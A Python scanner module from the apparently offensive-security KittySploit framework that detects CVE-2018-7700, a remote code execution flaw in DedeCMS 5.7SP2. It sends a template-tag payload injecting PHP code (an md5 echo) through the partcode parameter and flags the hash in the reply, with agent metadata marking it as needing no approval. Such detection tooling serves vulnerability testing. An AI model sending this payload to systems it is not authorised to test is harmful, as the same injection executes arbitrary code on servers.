#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DedeCMS 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DedeCMS 5.7SP2 - Cross-Site Request Forgery/Remote Code Execution Detection',
        'description': 'DedeCMS 5.7SP2 is susceptible to cross-site request forgery with a corresponding impact of arbitrary code execution because the partcode parameter in a tag_test_action.php request can specify a runphp field in conjunction with PHP code.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'dedecms', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://laworigin.github.io/2018/03/07/CVE-2018-7700-dedecms%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7700',
            'https://github.com/0ps/pocassistdb',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-7700',
    }

    def run(self):
        r = self.http_request(method="GET", path='/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5%28%22CVE-2018-7700%22%29%3B{/dede:field}', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('4cc32a3a81d2bb37271934a48ce4468a',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="DedeCMS 5.7SP2 - Cross-Site Request Forgery/Remote Code Execution detected",
                path='/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5%28%22CVE-2018-7700%22%29%3B{/dede:field}',
            )
            return True
        return False

